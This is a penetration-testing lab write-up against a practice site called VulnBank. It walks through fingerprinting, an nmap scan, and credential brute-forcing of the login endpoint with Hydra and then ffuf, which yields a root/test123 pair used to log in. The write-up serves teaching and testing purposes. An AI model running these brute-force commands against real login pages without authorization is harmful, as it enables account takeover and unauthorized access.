🏦 VulnBank - Web Application Security Testing Writeup
📌 Target Information
Category	Details
Target	VulnBank
Website	https://vulnbank.org
Tools Used	Wappalyzer, Nmap, Hydra, Browser Developer Tools
Focus	Technology Fingerprinting, Port Scanning, HTTP Login Testing
---
🧠 Overview
This writeup documents the reconnaissance and login-testing steps performed against VulnBank.
The workflow covered:
Technology fingerprinting with Wappalyzer
Service enumeration with Nmap
HTTP POST login testing with Hydra
Reviewing the login response in Browser Developer Tools
> Testing should only be performed on systems for which you have explicit authorization.
---
🔍 Task 1 - Technology Fingerprinting
We opened `https://vulnbank.org` and inspected the website using the Wappalyzer browser extension.
![Wappalyzer technology detection](images/01-wappalyzer.png)
Technologies Detected
Category	Technology
Analytics	Cloudflare Browser Insights
CDN	Cloudflare
Miscellaneous	HTTP/3
RUM	Cloudflare Browser Insights
These are the technologies reported by Wappalyzer in the screenshot. No specific software versions were shown.
---
🔎 Task 2 - Port Scanning with Nmap
We used Nmap to identify open TCP ports and attempt service/version detection.
Command Used
```bash
nmap -sV vulnbank.org
```
Command Breakdown
Option	Explanation
`nmap`	Launches Nmap
`-sV`	Attempts to identify service/version information
`vulnbank.org`	Target hostname
Scan Results
![Nmap scan results](images/02-nmap.png)
Port	State	Service	Detection
80/tcp	Open	HTTP	Cloudflare HTTP proxy
443/tcp	Open	SSL/HTTP	Cloudflare HTTP proxy
8080/tcp	Open	HTTP	Cloudflare HTTP proxy
8443/tcp	Open	SSL/HTTP	Cloudflare HTTP proxy
The scan also reported:
Host was up with approximately `0.027s` latency.
`996` TCP ports were filtered (no response).
The scanned address was `188.114.97.6`.
The scan completed in approximately `96.95` seconds.
Observation
Nmap detected Cloudflare HTTP proxy on the listed ports. These results describe the network-facing infrastructure observed for the domain and do not establish which services are running directly on the origin server.
---
⚔️ Task 3 - HTTP Login Testing with Hydra
We tested the web login endpoint using Hydra and two different wordlist combinations.
Analyzing the Login Request
The login request was inspected in Browser Developer Tools under the Network tab.
The request details shown were:
Category	Details
Request URL	`https://vulnbank.org/login`
Request Method	POST
Status Code	`401 Unauthorized`
Content-Type	`application/json`
Server	`cloudflare`
![Login request response in DevTools](images/04-login-response-devtools.png)
The `401 Unauthorized` response indicates that the inspected request was not accepted as authenticated.
Attempt 1 - Short Wordlists
```bash
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \\
-P /usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt \\
-u -t 1 -f \\
vulnbank.org \\
http-post-form "/login:username=^USER^\&password=^PASS^:F=Invalid credentials"
```
Options
Option	Explanation
`-L`	Username list file
`-P`	Password list file
`-u`	Tries each username against the password list before moving to the next username
`-t 1`	One parallel task
`-f`	Stops after Hydra reports a valid pair
`http-post-form`	HTTP POST form module
`/login`	Login endpoint
`username=^USER^\&password=^PASS^`	POST form parameters
`F=Invalid credentials`	Configured failure-string check
Attempt 2 - Larger Wordlists
```bash
hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \\
-P /usr/share/wordlists/rockyou.txt \\
-u -t 1 -f \\
vulnbank.org \\
http-post-form "/login:username=^USER^\&password=^PASS^:F=Invalid credentials"
```
![Hydra attempts and reported matches](images/03-hydra-attempts.png)
Result and Verification
Hydra reported a credential pair as valid in each attempt. However, the login request inspected in Developer Tools returned:
```text
401 Unauthorized
```
Therefore, the reported matches were not confirmed by successful authentication. The configured failure condition may not have accurately represented the application's actual failure response, which can cause a false positive.
A Hydra-reported match should not be treated as verified credentials until authentication is confirmed by the application.
---
🧪 Current Finding
Wappalyzer identified Cloudflare-related technologies.
Nmap reported four open TCP ports: `80`, `443`, `8080`, and `8443`.
Hydra reported matches during both HTTP POST form attempts, but those matches were not confirmed.
FFUF tested the login endpoint with a JSON POST body and filtered HTTP 401 responses.
FFUF identified the `root` / `test123` pair with an HTTP 200 response.
The subsequent dashboard displayed `Welcome back, root`, confirming successful authentication.
---
🕵️ Task 4 - Discovering Login Credentials with FFUF
After the Hydra attempts produced unverified matches, we tested the login endpoint with FFUF using a JSON POST request and response-status filtering.
Command Used
```bash
ffuf -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt:USER \\
-w /usr/share/seclists/Passwords/Common-Credentials/Pwdb\_top-1000.txt:PASS \\
-X POST \\
-H 'Content-Type: application/json' \\
-d '{"username":"USER","password":"PASS"}' \\
-u https://vulnbank.org/login \\
-fc 401 \\
-rate 10
```
Command Breakdown
Option	Explanation
`-w ...:USER`	Loads the username wordlist and assigns the `USER` keyword
`-w ...:PASS`	Loads the password wordlist and assigns the `PASS` keyword
`-X POST`	Sends HTTP POST requests
`-H`	Sets the request header
`-d`	Sends the JSON request body
`-u`	Specifies the target login URL
`-fc 401`	Filters responses with HTTP status code 401
`-rate 10`	Limits the request rate to 10 requests per second
FFUF Result
![FFUF discovered credential pair](images/05-ffuf-discovery.png)
FFUF displayed a response with HTTP status `200` for the following pair:
```text
Username: root
Password: test123
```
The result differed from the earlier Hydra output because FFUF used a JSON request body and filtered the `401 Unauthorized` responses observed during the previous login testing.
Successful Login
We then used the discovered credentials to log in to VulnBank.
![Successful VulnBank login](images/06-successful-login-dashboard.png)
The dashboard displayed:
```text
Welcome back, root
```
This confirmed that the credentials found by FFUF successfully authenticated to the application.
---
🏁 Conclusion
This exercise covered technology fingerprinting, port/service enumeration, and login testing with Hydra and FFUF.
Hydra reported unverified matches, while FFUF identified a credential pair that was then confirmed by successfully logging in and reaching the VulnBank dashboard.
---
🛡️ Disclaimer
This writeup is for educational purposes and documents testing performed in an authorized environment. Do not test systems without permission.
